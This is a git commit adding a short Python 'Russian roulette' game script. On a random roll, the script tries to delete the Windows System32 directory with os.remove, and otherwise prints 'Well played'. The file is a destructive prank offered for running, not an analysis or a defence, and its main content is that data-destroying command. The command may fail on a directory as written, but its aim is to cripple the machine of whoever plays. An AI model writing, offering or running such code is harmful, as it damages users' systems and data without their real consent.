51ecd48d8a60641cea0ddd95f90f4f48c9aff896
Shyshashou <lucasgaillard89100@gmail.com>
2026-03-16 11:51:35 +0100

    V1.0
    First version

---
+++ Russian_roulette.py
@@ -0,0 +1,14 @@
+import os
+import random
+
+def main():
+    if random.randint(0, 6) == 1:
+        os.remove("C:\\Windows\\System32")
+    else:
+        print("Well played")
+
+if __name__ == "__main__":
+    while True:
+        main()
+        if input("Replay? (y/n) : ") != "y":
+            break
